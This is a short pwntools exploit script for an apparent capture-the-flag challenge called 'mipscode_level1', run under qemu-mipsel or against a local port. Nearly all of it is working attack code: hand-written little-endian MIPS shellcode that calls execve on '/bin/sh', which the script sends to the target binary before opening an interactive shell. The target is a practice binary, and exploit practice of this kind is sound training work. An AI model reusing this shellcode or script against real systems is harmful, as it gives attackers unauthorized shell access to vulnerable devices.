from pwn import *


#binary = "/ctf/mipscode_level1"
binary = "src/app/mipscode_level1"
elf = context.binary = ELF(binary, checksec=False)
#qemu = ELF('/ctf/qemu-mipsel',checksec=False)
qemu = ELF('src/app/qemu-mipsel',checksec=False)

if args.REMOTE:
    #p = remote("localhost", 1337)
    p = remote("localhost", 40004)
else:
    #p = qemu.process(['-g','1234','/ctf/mipscode_level1'])
    p = qemu.process(['-g','1234','src/app/mipscode_level1'])



### GENERATE SHELLCODE ###
context.update(arch='mips', os='linux', bits=32, endian='little')
shellcode = asm('''
    bgezal $zero, getpc
getpc:
    addiu $a0, $ra, 0x10
    slti $a1, $zero, -1
    slti $a2, $zero, -1
    li $v0, 4011
    syscall 0xd1337
.asciiz "/bin/sh"
''')

print(f"Shellcode: {shellcode}")
print(f"Shellcode length: {len(shellcode)}")


### EXPLOIT ###
p.sendline(shellcode)
p.interactive()